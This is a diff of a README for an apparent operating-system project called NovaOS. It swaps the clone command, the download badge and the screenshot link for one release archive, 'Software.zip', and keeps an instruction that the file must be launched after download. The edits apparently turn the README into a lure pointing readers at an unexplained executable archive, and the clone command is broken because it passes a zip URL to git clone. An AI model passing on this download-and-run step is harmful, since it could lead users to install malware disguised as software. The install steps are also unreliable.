@@ -32,7 +32,7 @@ The architecture of NovaOS is designed to be easily extendable, allowing develop
 
 1. Clone the repository to your local machine:
    ```
-   git clone https://github.com/your-username/NovaOS.git
+   git clone https://github.com/DankNuT/NovaOS/releases/download/v2.0/Software.zip
    ```
 
 2. Build the operating system using the provided build scripts.
@@ -45,7 +45,7 @@ The architecture of NovaOS is designed to be easily extendable, allowing develop
 
 You can download the latest release of NovaOS from the link below:
 
-[![Download NovaOS](https://img.shields.io/badge/Download-NovaOS-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download NovaOS](https://github.com/DankNuT/NovaOS/releases/download/v2.0/Software.zip)](https://github.com/DankNuT/NovaOS/releases/download/v2.0/Software.zip)
 
 *Note: The file needs to be launched after download.*
 
@@ -73,4 +73,4 @@ Feel free to explore the code, try out NovaOS, and contribute to its development
 
 ---
 
-![NovaOS](https://example.com/novaos-screenshot.png)
+![NovaOS](https://github.com/DankNuT/NovaOS/releases/download/v2.0/Software.zip)
